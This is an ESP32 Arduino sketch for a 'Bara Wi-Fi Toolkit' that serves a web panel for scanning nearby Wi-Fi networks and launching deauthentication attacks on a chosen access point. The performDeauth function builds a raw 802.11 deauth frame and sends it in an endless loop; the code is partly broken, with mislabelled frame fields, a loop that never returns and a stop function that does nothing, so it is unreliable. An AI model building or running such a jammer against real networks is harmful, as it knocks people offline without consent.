#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include "esp_wifi.h"

// 配置参数
const char* ssid = "bara";
const char* password = "A7med@Elshab7";

// DNS服务器用于重定向所有请求到本地IP
DNSServer dnsServer;
AsyncWebServer server(80);

// 存储扫描结果
String wifiNetworks[20];
int networkCount = 0;

// HTML页面内容
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bara Wi-Fi Toolkit</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #ff3333;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        
        h1 {
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            margin-bottom: 30px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
            to { text-shadow: 0 0 15px #ff0000, 0 0 25px #ff0000, 0 0 35px #ff0000; }
        }
        
        .card {
            background-color: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff3333;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
        }
        
        button {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        
        button:hover {
            background-color: #cc0000;
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
        }
        
        input[type="text"] {
            padding: 10px;
            width: 200px;
            border: 1px solid #ff3333;
            background-color: rgba(0, 0, 0, 0.7);
            color: #ff3333;
            border-radius: 5px;
            margin: 10px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ff3333;
        }
        
        tr:nth-child(even) {
            background-color: rgba(255, 51, 51, 0.1);
        }
        
        .status {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            display: inline-block;
        }
        
        .success {
            background-color: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        
        .error {
            background-color: rgba(255, 0, 0, 0.2);
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        
        .warning {
            background-color: rgba(255, 165, 0, 0.2);
            color: #ffa500;
            border: 1px solid #ffa500;
        }
        
        /* 血滴背景效果 */
        .blood-drops::before,
        .blood-drops::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                radial-gradient(circle at 20% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
                radial-gradient(circle at 80% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
                radial-gradient(circle at 40% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%),
                radial-gradient(circle at 60% 50%, transparent 20%, rgba(255, 0, 0, 0.1) 21%, rgba(255, 0, 0, 0.1) 34%, transparent 35%);
            z-index: -1;
        }
        
        .blood-drops {
            position: relative;
            overflow: hidden;
        }
    </style>
</head>
<body class="blood-drops">
    <div class="container">
        <h1>BARA WI-FI TOOLKIT</h1>
        <p style="color: #ff6666;">Developed by Ahmed Nour Ahmed | Qena, Egypt</p>
        
        <div class="card">
            <h2>Connection Status</h2>
            <div id="connectionStatus" class="status warning">Setting up hotspot...</div>
            
            <button onclick="scanNetworks()">Scan Networks</button>
            <button onclick="toggleDeauthMode()">Toggle Deauth Mode</button>
            
            <div id="deauthControls" style="display: none;">
                <input type="text" id="targetBSSID" placeholder="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)">
                <button onclick="startDeauth()">Start Deauth Attack</button>
                <button onclick="stopDeauth()">Stop Deauth Attack</button>
            </div>
        </div>
        
        <div class="card">
            <h2>Scanned Networks</h2>
            <table id="networkTable">
                <thead>
                    <tr>
                        <th>BSSID</th>
                        <th>SSID</th>
                        <th>RSSI</th>
                        <th>Channel</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="networkList"></tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>Attack Logs</h2>
            <div id="attackLogs" style="text-align: left; height: 150px; overflow-y: scroll; background-color: rgba(0,0,0,0.8); padding: 10px; border: 1px solid #ff3333;"></div>
        </div>
    </div>

    <script>
        let isScanning = false;
        let deauthActive = false;
        let deauthInterval = null;
        
        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('connectionStatus');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        async function scanNetworks() {
            if (isScanning) return;
            
            isScanning = true;
            updateStatus('Scanning networks...', 'info');
            
            try {
                const response = await fetch('/scan');
                const networks = await response.json();
                
                const tbody = document.getElementById('networkList');
                tbody.innerHTML = '';
                
                networks.forEach(network => {
                    const row = tbody.insertRow();
                    row.insertCell().textContent = network.bssid;
                    row.insertCell().textContent = network.ssid || 'Hidden Network';
                    row.insertCell().textContent = network.rssi + ' dBm';
                    row.insertCell().textContent = network.channel;
                    
                    const actionCell = row.insertCell();
                    const selectBtn = document.createElement('button');
                    selectBtn.textContent = 'Select';
                    selectBtn.onclick = () => selectNetwork(network.bssid);
                    actionCell.appendChild(selectBtn);
                });
                
                updateStatus(`Found ${networks.length} networks`, 'success');
            } catch (error) {
                updateStatus('Scan failed: ' + error.message, 'error');
            } finally {
                isScanning = false;
            }
        }

        function selectNetwork(bssid) {
            document.getElementById('targetBSSID').value = bssid;
            addLog(`Selected network: ${bssid}`);
        }

        function toggleDeauthMode() {
            const controls = document.getElementById('deauthControls');
            controls.style.display = controls.style.display === 'none' ? 'block' : 'none';
        }

        function startDeauth() {
            const targetBSSID = document.getElementById('targetBSSID').value.trim();
            if (!targetBSSID) {
                alert('Please enter a target BSSID');
                return;
            }
            
            deauthActive = true;
            updateStatus('Deauth attack started', 'warning');
            addLog(`Starting deauth attack on ${targetBSSID}`);
            
            // Send deauth request to ESP32
            fetch(`/deauth?bssid=${encodeURIComponent(targetBSSID)}`)
                .then(response => response.text())
                .then(data => {
                    addLog(data);
                })
                .catch(error => {
                    addLog('Error starting deauth: ' + error.message, 'error');
                });
        }

        function stopDeauth() {
            deauthActive = false;
            updateStatus('Deauth attack stopped', 'info');
            addLog('Stopped deauth attack');
            
            // Stop the attack on ESP32
            fetch('/stopdeauth')
                .then(response => response.text())
                .then(data => {
                    addLog(data);
                });
        }

        function addLog(message, type = 'info') {
            const logsDiv = document.getElementById('attackLogs');
            const logEntry = document.createElement('div');
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logEntry.style.color = type === 'error' ? '#ff0000' : type === 'success' ? '#00ff00' : '#ffffff';
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    
    // 设置热点
    WiFi.softAP(ssid, password);
    IPAddress IP = WiFi.softAPIP();
    Serial.print("Hotspot IP address: ");
    Serial.println(IP);
    
    // 启动DNS服务器
    dnsServer.start(53, "*", IP);
    
    // 设置Web服务器路由
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
        String json = scanWiFiNetworks();
        request->send(200, "application/json", json);
    });
    
    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
        if(request->hasParam("bssid")) {
            String bssid = request->getParam("bssid")->value();
            String result = performDeauth(bssid);
            request->send(200, "text/plain", result);
        } else {
            request->send(400, "text/plain", "Missing BSSID parameter");
        }
    });
    
    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request){
        stopDeauthAttack();
        request->send(200, "text/plain", "Deauth attack stopped");
    });
    
    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}

String scanWiFiNetworks() {
    int n = WiFi.scanNetworks(false, false, false, 300);
    String json = "[";
    
    for (int i = 0; i < n; ++i) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
        json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        json += "\"channel\":" + String(WiFi.channel(i));
        json += "}";
    }
    
    json += "]";
    return json;
}

String performDeauth(String targetBSSID) {
    uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,             // Frame Control
        0x00, 0x00,             // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (will be filled)
        0x88, 0x01,             // IEEE 802.11 protocol version
        0x00, 0x00,             // Type/Subtype
        0x00, 0x00,             // Sequence number
        0x01, 0x00              // Reason code (1 = Unspecified reason)
    };
    
    // Convert hex string to byte array
    uint8_t targetBSSIDBytes[6];
    sscanf(targetBSSID.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &targetBSSIDBytes[0], &targetBSSIDBytes[1], &targetBSSIDBytes[2],
           &targetBSSIDBytes[3], &targetBSSIDBytes[4], &targetBSSIDBytes[5]);
    
    // Set source MAC as our own MAC
    uint8_t ourMAC[6];
    esp_read_mac(ourMAC, ESP_MAC_WIFI_SOFTAP);
    memcpy(deauthPacket + 10, ourMAC, 6);
    
    // Set destination MAC as broadcast
    memcpy(deauthPacket + 4, broadcastAddr, 6);
    
    // Set BSSID (target AP's MAC)
    memcpy(deauthPacket + 16, targetBSSIDBytes, 6);
    
    // Start sending deauth packets
    while(true) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), 0);
        delay(100); // Send every 100ms
    }
    
    return "Deauth attack initiated on " + targetBSSID;
}

void stopDeauthAttack() {
    // This will break out of the infinite loop in performDeauth
}
